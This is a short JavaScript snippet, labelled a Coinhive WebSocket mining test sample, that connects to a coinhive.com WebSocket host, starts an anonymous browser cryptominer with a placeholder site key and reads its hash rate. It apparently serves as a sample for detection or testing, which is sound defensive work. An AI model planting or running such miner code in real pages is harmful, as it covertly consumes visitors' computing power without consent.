// Coinhive WebSocket mining test sample
var ws = new WebSocket("wss://ws001.coinhive.com");
var miner = new CoinHive.Anonymous("SITEKEY1234567890123456789012345678");
miner.start();
var h = miner.getHashesPerSecond();
